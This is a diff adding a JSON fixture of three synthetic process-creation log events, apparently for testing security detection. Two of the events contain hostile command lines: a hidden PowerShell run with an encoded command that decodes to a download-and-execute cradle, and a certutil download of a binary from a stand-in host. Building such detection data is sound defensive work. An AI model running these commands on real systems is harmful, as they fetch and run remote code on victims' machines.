@@ -1,0 +1,27 @@
+[
+  {
+    "timestamp": "2026-08-10T22:06:00Z",
+    "event_id": "proc-001",
+    "event_type": "ProcessCreated",
+    "user": "finance.admin@example.org",
+    "source_ip": "198.51.100.77",
+    "device": "FIN-WS-02",
+    "command_line": "powershell.exe -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA"
+  },
+  {
+    "timestamp": "2026-08-10T22:07:00Z",
+    "event_id": "proc-002",
+    "event_type": "ProcessCreated",
+    "user": "finance.admin@example.org",
+    "device": "FIN-WS-02",
+    "command_line": "certutil.exe -urlcache -split -f https://example.invalid/update.bin C:\\Users\\Public\\update.bin"
+  },
+  {
+    "timestamp": "2026-08-10T12:00:00Z",
+    "event_id": "proc-003",
+    "event_type": "ProcessCreated",
+    "user": "analyst@example.org",
+    "device": "SOC-WS-01",
+    "command_line": "notepad.exe C:\\Temp\\notes.txt"
+  }
+]
